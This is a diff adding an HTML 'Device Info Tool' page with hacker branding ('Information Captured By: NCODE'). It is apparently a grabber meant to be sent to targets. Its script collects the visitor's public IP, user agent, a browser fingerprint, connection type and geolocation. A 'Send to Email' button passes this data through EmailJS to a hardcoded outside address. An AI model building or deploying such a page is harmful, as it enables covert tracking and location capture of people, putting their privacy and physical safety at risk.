@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta property="og:title" content="">
+  <meta property="og:description" content="BY NCODE"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Device Info Tool</title>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <style>
+    @font-face {
+      font-family: 'Iceberg';
+      font-style: normal;
+      font-weight: 400;
+      src: local('Iceberg'), local('Iceberg-Regular'), url(https://fonts.gstatic.com/s/iceberg/v7/8QIJdijAiM7o-qnZiI8EqprnEO0.woff2) format('woff2');
+    }
+    @font-face {
+      font-family: 'Wallpoet';
+      font-style: normal;
+      font-weight: 400;
+      src: local('Wallpoet'), url(https://fonts.gstatic.com/s/wallpoet/v11/f0X10em2_8RnXVVdUObp58Tt868H.woff2) format('woff2');
+    }
+    html, body {
+      height: 100%;
+      background: black url('https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-hacked_gif.gif') no-repeat center center fixed;
+      background-size: cover;
+      color: #39ff14;
+      font-family: 'Orbitron', 'Roboto', 'Iceberg', 'Wallpoet', monospace, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      position: relative;
+    }
+    #particles-js {
+      width: 100%;
+      height: 100%;
+      background-size: cover;
+      background-position: 50% 50%;
+      position: fixed;
+      top: 0px;
+      left: 0px;
+      z-index: 1;
+    }
+    .container {
+      background: rgba(0,0,0,0.7);
+      border-radius: 12px;
+      box-shadow: 0 0 24px #222;
+      max-width: 600px;
+      margin: 60px auto 0 auto;
+      padding: 32px 28px 24px 28px;
+      position: relative;
+      z-index: 2;
+    }
+    h1 {
+      font-family: 'Wallpoet', 'Orbitron', monospace;
+      font-size: 2em;
+      letter-spacing: 2px;
+      text-align: center;
+      margin-bottom: 28px;
+      color: #39ff14;
+      text-shadow: 0 0 25px rgba(254,254,255,.25);
+    }
+    pre#info {
+      background: #181818cc;
+      color: #39ff14;
+      border-radius: 8px;
+      padding: 16px;
+      font-size: 1em;
+      margin-top: 10px;
+      min-height: 60px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      box-shadow: 0 0 8px #222;
+      font-family: 'Iceberg', 'Wallpoet', 'Orbitron', monospace;
+    }
+    .btn-group, button {
+      background: #222;
+      color: #39ff14;
+      border: 1px solid #39ff14;
+      border-radius: 5px;
+      padding: 7px 16px;
+      font-family: 'Orbitron', monospace;
+      font-size: 1em;
+      transition: background 0.2s, color 0.2s;
+      cursor: pointer;
+      margin-top: 10px;
+      margin-bottom: 10px;
+    }
+    button:hover {
+      background: #39ff14;
+      color: #181818;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 16px 4vw;
+      }
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    // Inisialisasi EmailJS (WAJIB)
+    emailjs.init("YOUR_PUBLIC_KEY"); // Ganti YOUR_PUBLIC_KEY dengan public key dari dashboard EmailJS
+
+    window.onload = function() {
+      particlesJS('particles-js', {
+        "particles": {
+          "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
+          "color": { "value": "#cccccc" },
+          "shape": { "type": "circle", "stroke": { "width": 0, "color": "#000000" }, "polygon": { "nb_sides": 5 } },
+          "opacity": { "value": 0.5, "random": false },
+          "size": { "value": 5, "random": true },
+          "line_linked": { "enable": true, "distance": 150, "color": "#cccccc", "opacity": 0.4, "width": 1 },
+          "move": { "enable": true, "speed": 6, "direction": "none", "random": false, "straight": false, "out_mode": "out" }
+        },
+        "interactivity": {
+          "detect_on": "canvas",
+          "events": {
+            "onhover": { "enable": true, "mode": "repulse" },
+            "onclick": { "enable": true, "mode": "push" },
+            "resize": true
+          },
+          "modes": {
+            "grab": { "distance": 400, "line_linked": { "opacity": 1 } },
+            "bubble": { "distance": 400, "size": 40, "duration": 2, "opacity": 8, "speed": 3 },
+            "repulse": { "distance": 200 },
+            "push": { "particles_nb": 4 },
+            "remove": { "particles_nb": 2 }
+          }
+        },
+        "retina_detect": true
+      });
+    }
+  </script>
+</head>
+<body background="https://nathanprinsley-files.prinsh.com/data-1/images/NathanPrinsley-hacked_gif.gif" title="MR.PRINS" bgcolor="black">
+  <div id="particles-js"></div>
+  <div class="container">
+    <h1>NEW DEVICE INFORMATION</h1>
+    <pre id="info">Loading...</pre>
+    <div style="margin-top:16px;display:flex;gap:10px;">
+      <button id="copyBtn">Copy</button>
+      <button id="downloadBtn">Download TXT</button>
+      <button id="sendEmailBtn">Send to Email</button>
+    </div>
+  </div>
+  <script>
+    // Tombol Copy
+    document.getElementById('copyBtn').onclick = function() {
+      const text = document.getElementById('info').innerText;
+      if (text) navigator.clipboard.writeText(text);
+    };
+    // Tombol Download
+    document.getElementById('downloadBtn').onclick = function() {
+      const text = document.getElementById('info').innerText;
+      if (!text) return;
+      const blob = new Blob([text], {type: "text/plain"});
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = "device_info.txt";
+      link.click();
+    };
+    // Tombol Send to Email (tanpa alert)
+    document.getElementById('sendEmailBtn').onclick = function() {
+      const text = document.getElementById('info').innerText;
+      emailjs.send("service_ee1jmqd", "template_xgutrmc", {
+        message: text,
+        to_email: "expertfireone@email.com"
+      });
+    };
+
+    // Helper untuk bold label
+    function bold(label, value) {
+      return `<span style="color:#39ff14;"><b>${label}</b></span> <span style="color:#fff;">${value}</span>`;
+    }
+
+    let infoLines = [];
+
+    // IP Public
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        infoLines[0] = bold('IP Public:', data.ip);
+        updateInfo();
+      });
+
+    // User Agent
+    infoLines[1] = bold('User Agent:', navigator.userAgent);
+
+    // Fingerprint
+    function simpleFingerprint() {
+      return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
+    }
+    infoLines[2] = bold('Fingerprint:', simpleFingerprint());
+
+    // Network Info
+    if (navigator.connection) {
+      infoLines[3] = bold('Connection:', navigator.connection.effectiveType);
+    }
+
+    // Geolocation (izin akses, tanpa alert)
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        infoLines[4] = bold('Location:', `${pos.coords.latitude}, ${pos.coords.longitude}`);
+        updateInfo();
+      });
+    }
+
+    // Footer
+    infoLines[5] = `<br><span style="color:#888;">Information Captured By: <b>NCODE</b></span>`;
+
+    // Update info ke halaman
+    function updateInfo() {
+      document.getElementById('info').innerHTML = infoLines.filter(Boolean).join('<br><br>');
+    }
+    // Tampilkan info awal
+    updateInfo();
+  </script>
+</body>
+</html>
